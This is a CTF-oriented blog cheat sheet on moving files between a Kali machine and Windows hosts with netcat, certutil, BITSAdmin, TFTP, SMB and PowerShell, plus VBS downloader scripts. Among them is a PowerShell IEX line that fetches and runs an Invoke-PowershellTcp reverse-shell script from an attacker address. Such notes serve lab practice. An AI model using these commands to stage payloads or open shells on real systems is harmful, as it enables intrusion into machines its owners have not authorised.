---
title: "File_Transfer"
date: 2022-11-05 17.04
categories: [Miscellaneous, CTF]
tags: [file_transfering , file_server, netcat, powershell]
author: LXD
image: /assets/img/posts/misc/Data-Transfer.jpg
---

![Data-Transfer](/assets/img/posts/misc/Data-Transfer.jpg)
***Python***
- **`python3 -m http.server 80`**
***
***Netcat***
- (on the receiver side) **`nc -l -p 1234 > [file_name]`**
- (on the sender side) **`nc -w 3 10.2.111.159 1234 < [file_name]`**

**On Windows run:**

-	 `nc.exe -nv 10.0.0.1 4444 < file.exe`
***
**Powershell**

**Transferring from Kali to Windows**
*Go to terminal open a listener with :*
- `python3 -m http.server 80`
*Download it from Windows(As x64 bits) :*
- `C:\\Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.Webclient).downloadStrings('http://10.10.10.10/Invoke-PowershellTcp.ps1')`
***
OR
***CertUtil***

*certutil.exe is available on more modern versions of Windows.*

`certutil.exe -urlcache -split -f http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe`

***

***FTP***

*We can use python to create a quick FTP server. Install the following package:*

`apt install python3-pyftpdlib`

**Transferring from Kali to Windows**

-	`python3 -m pyftpdlib -p 21`

**OR**

-	`python -m pyftpdlib -p 21`
***
***SSH***
*We can upload and downloand file through ssh via scp:*

**Downloading:**
- `scp sarah@10.10.54.199:'/Path/To/The/File' wordlist.txt`

**Uploading:**
- `scp /home/fl3sh/hash.txt john@192.168.10.5:/home/john/scripts`

*On Windows, create a text file with the commands you wish to use:*
```
echo open 192.168.1.78 > ftp.txt
echo binary >> ftp.txt
echo get test.txt >> ftp.txt
echo bye >> ftp.txt
```
*You can then execute the commands in the file with the following command:*

-	`ftp -A -s:ftp.txt`

***
***TFTP***

*TFTP is installed by default on Windows XP. It may not be installed on other versions of Windows. Sometimes it can be enabled on the command line:**

`pkgmgr /iu:"TFTP"`

On Kali install a TFTP server:

`apt install atftpd`

Create a dedicated tftp directory and change the ownership:
```
mkdir /tftp
chown nobody:nogroup /tftp
```

Run the TFTP server:

`atftpd --daemon --no-fork /tftp/`

**Transferring from Kali to Windows**

`tftp -i 10.0.0.1 GET file.exe`

**Transferring from Windows to Kali**

`tftp -i 10.0.0.1 PUT file.exe`
***
***SMB***

**Run the server on Kali:**

`python /usr/share/doc/python-impacket/examples/smbserver.py kali /path/to/directory`

*On Windows, check that the share can be seen:**

`net view \\10.0.0.1`
Shared resources at \\10.0.0.1

(null)

Share name  Type  Used as  Comment

-----------------------------------
KALI        Disk
The command completed successfully.

Regular filesystem commands should all work, and files can be copied to and from the share:

1 -	`dir \\10.0.0.1\kali`
2 - `copy \\10.0.0.1\kali\file.exe C:\Windows\Temp\file.exe`
3 - `copy C:\Windows\Temp\file.exe \\10.0.0.1\kali\file.exe`
***
***HTTP***

`python3 -m http.server 4444`

OR

`python -m SimpleHTTPServer 4444`
***

***BITSAdmin***
`
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe`
***
**PowerShell Script**
`
powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('http://10.0.0.1:4444/file.exe','C:\Windows\Temp\file.exe')"`
***
**Can also be dumped into a script:**
```
echo $webclient = New-Object System.Net.WebClient > wget.ps1
echo $url = "http://10.0.0.1:4444/file.exe" >> wget.ps1
echo $output = "C:\Windows\Temp\file.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$output) >> wget.ps1
```
**Run with:**
-	`powershell wget.ps1`
***
***VBS Script***
```
strFileURL = "http://10.0.0.1:4444/file.exe"
strHDLocation = "C:\Windows\Temp\file.exe"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1 'adTypeBinary
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
```
**As a series of echo statements:**
```
echo strFileURL = "http://10.0.0.1:4444/file.exe" >> downloadfile.vbs
echo strHDLocation = "C:\Windows\Temp\file.exe" >> downloadfile.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> downloadfile.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> downloadfile.vbs
echo objXMLHTTP.send() >> downloadfile.vbs
echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> downloadfile.vbs
echo objADOStream.Open >> downloadfile.vbs
echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs
echo objADOStream.Position = 0 >> downloadfile.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> downloadfile.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs
echo Set objFSO = Nothing >> downloadfile.vbs
echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs
echo objADOStream.Close >> downloadfile.vbs
echo Set objADOStream = Nothing >> downloadfile.vbs
echo End if >> downloadfile.vbs
echo Set objXMLHTTP = Nothing >> downloadfile.vbs
echo ""
```
**Run with the following command:**
-	`cscript downloadfile.vbs`
